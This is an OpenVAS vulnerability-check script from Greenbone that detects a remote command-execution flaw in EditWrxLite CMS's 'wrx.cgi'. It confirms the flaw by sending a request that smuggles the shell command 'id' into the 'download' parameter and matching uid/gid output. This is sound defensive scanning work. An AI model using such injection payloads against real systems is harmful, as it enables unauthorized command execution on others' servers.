###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_EditWrxLite_51995.nasl 12 2013-10-27 11:15:33Z jan $
#
# EditWrxLite CMS 'wrx.cgi' Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "EditWrxLite CMS is prone to a remote command-execution vulnerability.

Attackers can exploit this issue to execute arbitrary commands with
the privileges of the affected application.";


if (description)
{
 script_id(103419);
 script_bugtraq_id(51995);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("EditWrxLite CMS 'wrx.cgi' Remote Command Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51995");
 script_xref(name : "URL" , value : "http://editwrx.com/index.htm");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-02-15 10:28:37 +0100 (Wed, 15 Feb 2012)");
 script_description(desc);
 script_summary("Determine if EditWrxLite CMS is prone to a remote command-execution vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/editwrx/",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/wrx.cgi"); 

  if(http_vuln_check(port:port, url:url,pattern:"<title>.*EditWrx")) {

    url = string(dir, "/wrx.cgi?download=;id|");

    if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
      security_hole(port:port);
      exit(0);
    }  
  }
}

exit(0);
